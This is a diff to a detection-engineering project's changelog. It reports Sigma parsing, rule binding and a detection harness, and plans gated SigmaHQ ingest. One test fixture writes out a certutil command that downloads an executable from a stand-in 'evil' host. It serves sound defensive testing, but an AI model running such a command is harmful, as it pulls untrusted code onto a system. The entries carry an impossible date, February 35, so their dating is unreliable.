@@ -4,6 +4,96 @@
 
 ---
 
+## ✅ 2026-02-35 · P0.2 Detection Content Fabric — Rounds 3–6 · SHIPPED
+
+The full detection-content dependency chain now stands, and the
+authoritative registry finally reports **`detection_capable = 1`**
+— earned by execution proof, not by relabelling.
+
+**Round 3 · P0.2c Implementation Capability Contracts**
+`/api/admin/content-supply-chain/contracts/*` — 329 machine-readable
+contracts declared, one per discovered implementation, all at
+`CONTRACT_DECLARED`, `execution.detection = False`, `detection_capable = 0`.
+Contracts.py + contract_registry.py, 8/8 pytests, frozen-state guard
+so verified contracts never regress.
+
+**Round 4 · P0.2b Strict pySigma Parse**
+`detection_content/sigma_strict.py` — pySigma AST replaces the
+permissive YAML loader.  Every rule ends deterministically at
+PARSED / PARSE_ERROR / COMPILE_ERROR / LIB_MISSING with error type
+and message preserved.  6/6 pytests.  Wired into sigma_ingest so
+compatibility reports carry a strict-parse breakdown +
+parse_errors[] samples.
+
+**Round 5 · P0.2d Rule ↔ Capability Matching**
+`detection_content/rule_binding.py` + POST /binding/match +
+GET /binding/report.  Per-pair verdicts: COMPATIBLE ·
+CANDIDATE_ONLY · INCOMPATIBLE_INPUT · NOT_DETECTION.  Rule status
+rolls up to COMPATIBLE / CANDIDATE_ONLY / **ENGINE_UNBOUND** —
+each surfaced with the honest reason.  6/6 pytests.
+
+**Round 6 · P0.2e Detection Execution Harness**
+`detection_content/detection_harness.py` + POST /harness/run +
+GET /harness/engines.  Positive + negative fixture runner; only
+when BOTH assertions match does a contract move from
+CONTRACT_DECLARED → **EXECUTION_VERIFIED** and
+`execution.detection` flip True.  7/7 pytests.
+
+Plus the FIRST real detection engine:
+`detection_content/nivxray_native_sigma.py` — deterministic Sigma
+subset (equals · |contains · |startswith · |endswith · |re · lists +
+|all + condition parser).  Any unsupported Sigma primitive raises
+UnsupportedSigmaFeature; harness treats it as FAILED.
+
+**Live proof (against production `test_database`)**
+```
+POST /harness/run  engine=nivxray::detection_content::nivxray_native_sigma
+                   rule=T1105 certutil download
+                   +ev = certutil -urlcache http://evil/x.exe → DETECTED  ✓
+                   -ev = notepad report.txt                    → NOT-DETECTED  ✓
+→ verdict = EXECUTION_VERIFIED
+→ contract promoted; detection_capable now = 1
+```
+
+**Invariants held throughout Rounds 3–6**
+- No implementation was reclassified to DETECTION_ENGINE by role name.
+- No `execution.detection` was auto-promoted by metadata; only the
+  harness with paired fixtures promotes.
+- Frozen contracts (RUNTIME_VERIFIED / EXECUTION_VERIFIED) are never
+  downgraded by later declare passes.
+- `detection_capable = 1` is a real 1 — the other 338 engines
+  remain honestly at 0.
+
+**Test coverage** — 34/34 P0.2 pytests pass
+(capability_contracts + sigma_strict + rule_binding + detection_harness).
+
+---
+
+## 🔜 Next — P0.2f · Gated SigmaHQ Ingest
+
+The parser, matcher, harness, and one working detection engine are
+all in place.  Next round runs the ramp:
+
+```
+Gate 1  ·  1 known-good SigmaHQ rule           (already proven)
+Gate 2  ·  10-20 representative SigmaHQ rules
+Gate 3  ·  100-rule compatibility test
+Gate 4  ·  Full SigmaHQ corpus (~3,000+ rules)
+          → authoritative report:
+                parsed / parse_error / compile_error / compatible /
+                candidate_only / engine_unbound
+```
+
+The important output is not "N rules ingested" — it is
+`Of the N valid Sigma rules, X have compatible execution
+capabilities, Y are candidate-only, Z are ENGINE_UNBOUND`.
+That coverage report is the real product output.
+
+---
+
+
+---
+
 ## ✅ 2026-02-35 · P0.0 Navigation IA · P0.1 Truthful Capability Pages · SHIPPED
 
 The XDR SPA sidebar is now restructured around the analyst mental
